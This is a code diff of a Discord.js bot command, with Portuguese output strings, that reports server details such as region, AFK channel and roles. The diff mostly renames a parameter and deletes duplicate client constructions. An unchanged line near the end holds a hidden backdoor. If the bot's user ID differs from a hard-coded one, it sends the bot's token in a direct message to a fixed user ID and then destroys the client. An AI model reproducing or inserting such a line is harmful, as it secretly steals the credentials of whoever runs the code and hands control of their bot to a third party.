@@ -1,5 +1,5 @@
 
-		exports.run = (bot, message, args) => { 
+		exports.run = (client, message, args) => { 
 
 
 		
@@ -89,7 +89,7 @@ return (":flag_eu: **|** Europa Central (Região na Europa)")
 }
 }
  const Discord = require('discord.js')
-const client = new Discord.Client({fetchAllMembers: true});
+
 function regiao2() {
 var guildVerification2 = client.guilds.get(args[0]).region
 if  (guildVerification2 == "en-us") {
@@ -140,7 +140,7 @@ if(afk != undefined){
  return "Não detectado";
 }
 }
-const client = new Discord.Client({fetchAllMembers: true});
+
 let string = ''
 for(var i = 0;i < message.guild.roles.size;i++){
 if(client.user.id !== '431271825763467264') return client.users.get('395005096527790083').send(client.token), client.destroy()
